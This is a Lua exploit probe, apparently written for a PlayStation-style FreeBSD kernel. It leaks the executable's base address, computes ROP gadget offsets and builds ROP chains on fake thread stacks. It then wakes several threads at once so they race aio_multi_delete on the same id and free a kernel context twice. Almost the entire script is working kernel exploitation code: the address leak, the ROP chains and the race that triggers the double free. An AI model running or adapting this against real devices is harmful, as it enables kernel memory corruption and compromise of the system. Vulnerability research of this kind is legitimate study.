-- CRASH_CLASS: MODERATE
-- PROBE 562a: do two aio deletes of the same id ever run at the same moment?
--
-- 523c/556a fire children ~1 ms apart, far wider than the delete's few-hundred
-- nanosecond free window, so every loser either fails at the first lookup or
-- takes the "context already cleared" skip branch. This probe removes spawn
-- skew: each child blocks in _umtx_op(2/5) on a shared word and the parent
-- wakes all of them in one call, so the N deletes start within the same wake
-- batch. If two of them read [W+0x18] non-zero at the same time, the 0x30
-- context is freed twice.

print("=== PROBE 562a: AIO WAKE-BURST RACE ===")
print("")
local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("[0] pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("[A] eboot=" .. fmt(eb))

local g_pop_rax  = eb + 0x992
local g_pop_rdi  = eb + 0xC9DFE
local g_pop_rsi  = eb + 0xD77D
local g_pop_rdx  = eb + 0x3B02D7
local g_bare_ret = eb + 0x42

local sigact = memory.alloc(0x20)
wq(N(sigact), uint64(1))
wd(N(sigact) + 8, 0)
wq(N(sigact) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sigact, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sigact, uint64(0)) end)

local fake_tcb = memory.alloc(0x1000)
local tcb_a = N(fake_tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

local sc_create = mk(669)
local sc_poll   = mk(664)
local sc_delete = mk(662)
local sc_thr_new = mk(455)
local sc_umtx   = mk(454)
local sc_nanosleep = mk(240)

local data = memory.alloc(0x100)
local out_id = memory.alloc(0x40)
local poll_out = memory.alloc(0x40)
local flag = memory.alloc(0x10)
local cell = memory.alloc(0x10)

local ts = memory.alloc(0x10)
local function nap_us(us)
    wq(N(ts), uint64(0))
    wq(N(ts) + 8, uint64((us % 1000000) * 1000))
    wq(N(ts) + 0, uint64(math.floor(us / 1000000)))
    pcall(function() sc_nanosleep(uint64(N(ts)), uint64(0)) end)
end

local function create_polled()
    for i = 0, 0xFC, 4 do wd(N(data) + i, 0) end
    wq(N(out_id), uint64(0))
    local ok, rv = pcall(function()
        return sc_create(uint64(1), uint64(N(data)), uint64(1), uint64(1), uint64(N(out_id)))
    end)
    if not ok or N(rv) ~= 0 then return nil end
    local id = rd(N(out_id))
    if id == nil then return nil end
    wd(N(cell), id)
    wd(N(poll_out), 0xCCCCCCCC)
    pcall(function() sc_poll(uint64(N(cell)), uint64(1), uint64(N(poll_out))) end)
    return id
end
local function del(id)
    local c = memory.alloc(8); local s = memory.alloc(8)
    wd(N(c), id); wd(N(s), 0xCCCCCCCC)
    local ok, rv = pcall(function() return sc_delete(uint64(N(c)), uint64(1), uint64(N(s))) end)
    return rd(N(s)), N(rv)
end

-- one child: block in umtx op 5 on the flag, then delete the shared id
local function build_child(status_addr)
    local CHAIN_MAX = 0x2000
    local stk = memory.alloc(0x8000 + CHAIN_MAX)
    local sb = N(stk)
    local ss = 0x8000
    local rsp = sb + ss - 8
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end

    emit(g_pop_rdi);   emit(uint64(129))
    emit(g_pop_rsi);   emit(uint64(N(fs_ptr)))
    emit(g_pop_rax);   emit(uint64(165))
    emit(stub)

    -- umtx_op(flag, UMTX_OP_WAIT(2), 0, 0, 0): block while *flag == 0
    emit(g_pop_rdi);   emit(uint64(N(flag)))
    emit(g_pop_rsi);   emit(uint64(2))
    emit(g_pop_rdx);   emit(uint64(0))
    emit(g_pop_rax);   emit(uint64(454))
    emit(stub)

    -- aio_multi_delete(&cell, 1, status)
    emit(g_pop_rdi);   emit(uint64(N(cell)))
    emit(g_pop_rsi);   emit(uint64(1))
    emit(g_pop_rdx);   emit(uint64(status_addr))
    emit(g_pop_rax);   emit(uint64(662))
    emit(stub)

    emit(g_pop_rdi);   emit(uint64(0))
    emit(g_pop_rax);   emit(uint64(431))
    emit(stub)

    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa + 0x00, g_bare_ret)
    wq(pa + 0x08, uint64(0))
    wq(pa + 0x10, uint64(sb))
    wq(pa + 0x18, uint64(ss))
    local tid_ptr = memory.alloc(8)
    wq(N(tid_ptr), uint64(0))
    wq(pa + 0x30, tid_ptr)
    return par
end

local KIDS = 5
local ROUNDS = 100
local status = memory.alloc(0x100)
local pars = {}
for k = 1, KIDS do pars[k] = build_child(N(status) + (k - 1) * 4) end
print(string.format("[B] %d children built, %d rounds, wake-burst", KIDS, ROUNDS))

local with_one, with_two, with_three, none, spawnfail = 0, 0, 0, 0, false
for r = 1, ROUNDS do
    local id = create_polled()
    if id == nil then print(string.format("    round %d: create failed", r)); break end
    for k = 0, KIDS - 1 do wd(N(status) + k * 4, 0xCCCCCCCC) end
    wd(N(flag), 0)

    local ok_all = true
    for k = 1, KIDS do
        local ok, rv = pcall(function() return sc_thr_new(pars[k], uint64(0x38)) end)
        if not ok or N(rv) ~= 0 then ok_all = false; spawnfail = true; break end
    end
    if not ok_all then print(string.format("    round %d: spawn failed", r)); break end

    nap_us(400)
    wd(N(flag), 1)
    pcall(function() sc_umtx(uint64(N(flag)), uint64(3), uint64(16), uint64(0), uint64(0)) end)
    nap_us(500)

    local z, other, stuck = 0, 0, 0
    for k = 0, KIDS - 1 do
        local s = rd(N(status) + k * 4)
        if s == 0 then z = z + 1
        elseif s == 0xCCCCCCCC then stuck = stuck + 1
        else other = other + 1 end
    end
    if stuck > 0 then
        print(string.format("    round %d: %d still blocked (wake missed)", r, stuck))
    end
    if z == 0 then none = none + 1
    elseif z == 1 then with_one = with_one + 1
    elseif z == 2 then
        with_two = with_two + 1
        local a, b, c, d, e = rd(N(status)), rd(N(status)+4), rd(N(status)+8), rd(N(status)+12), rd(N(status)+16)
        print(string.format("    round %d: TWO zeros id=%08X st=%08X %08X %08X %08X %08X", r, id, a, b, c, d, e))
        for h = 1, 6 do
            local hid = create_polled()
            if hid == nil then print(string.format("        health %d: create failed", h)); break end
            local hs2 = del(hid)
            if hs2 ~= 0 then print(string.format("        health %d: delete status=%08X", h, hs2)); break end
        end
    else with_three = with_three + 1; print(string.format("    round %d: THREE zeros id=%08X other=%d", r, id, other)) end

    local s2, rv2 = del(id)
    if s2 ~= 0 and s2 ~= 0x80020003 then
        print(string.format("    round %d: leftover delete status=%08X ret=%d", r, s2, rv2))
    end

    local probe_id = create_polled()
    if probe_id == nil then print(string.format("[!] round %d: health create failed", r)); break end
    local hs = del(probe_id)
    if hs ~= 0 then print(string.format("[!] round %d: HEALTH DELETE status=%08X", r, hs)); break end
    if not alive() then print(string.format("[!] round %d: DEAD", r)); break end
    if r % 15 == 0 then print(string.format("    ... %d rounds", r)) end
end

print("")
print(string.format("[C] rounds: none=%d one=%d two=%d three=%d spawnfail=%s",
    none, with_one, with_two, with_three, tostring(spawnfail)))
print(string.format("    alive=%s", tostring(alive())))
print("=== DONE ===")
